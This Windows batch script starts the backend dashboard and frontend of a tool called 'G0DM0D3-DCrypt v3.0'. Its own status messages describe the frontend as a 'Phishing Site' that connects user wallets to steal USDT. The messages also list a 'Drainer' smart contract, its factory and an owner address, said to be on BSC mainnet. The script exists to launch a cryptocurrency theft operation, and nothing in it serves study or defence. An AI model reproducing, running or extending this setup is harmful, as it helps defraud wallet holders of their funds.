@echo off
REM G0DM0D3-DCrypt v3.0 - Complete System Startup Script
REM This script starts all services needed for the system to run

echo.
echo ========================================
echo  G0DM0D3-DCrypt v3.0 System Startup
echo ========================================
echo.

REM Kill any existing Node processes
echo [1/4] Cleaning up existing processes...
taskkill /F /IM node.exe 2>nul
taskkill /F /IM npm.exe 2>nul

timeout /t 2

REM Start Backend on Port 3003
echo [2/4] Starting Backend Admin Dashboard (Port 3003)...
start "G0DM0D3 Backend" cmd /k "cd backend && node .\src\server"

timeout /t 3

REM Start Frontend on Port 3000
echo [3/4] Starting Frontend Phishing Site (Port 3000)...
start "G0DM0D3 Frontend" cmd /k "cd frontend && npm run dev -- -p 3000"

timeout /t 3

REM Display status
echo.
echo ========================================
echo  ✓ System Started Successfully!
echo ========================================
echo.
echo FRONTEND (Phishing Site):
echo   URL: http://localhost:3000
echo   Connects user wallets to steal USDT
echo.
echo BACKEND (Admin Dashboard):
echo   URL: http://localhost:3003
echo   Dashboard: http://localhost:3003/api/dashboard
echo.
echo SMART CONTRACTS (BSC Mainnet):
echo   Drainer: 0x5c19b79aa20EF0b58c21bD4Ab7C30c9d6B048322
echo   Factory: 0xcFaF3127B29825F0566e7CeA0B199d0A88875B01
echo   Owner: 0x97127fa70102A054B8bcD244491e5037927606e6
echo.
echo BLOCKCHAIN EXPLORER:
echo   https://bscscan.com/address/0x5c19b79aa20EF0b58c21bD4Ab7C30c9d6B048322
echo.
echo ========================================
echo.
echo Two new terminal windows should open.
echo Close this window when done, it will stop all services.
pause
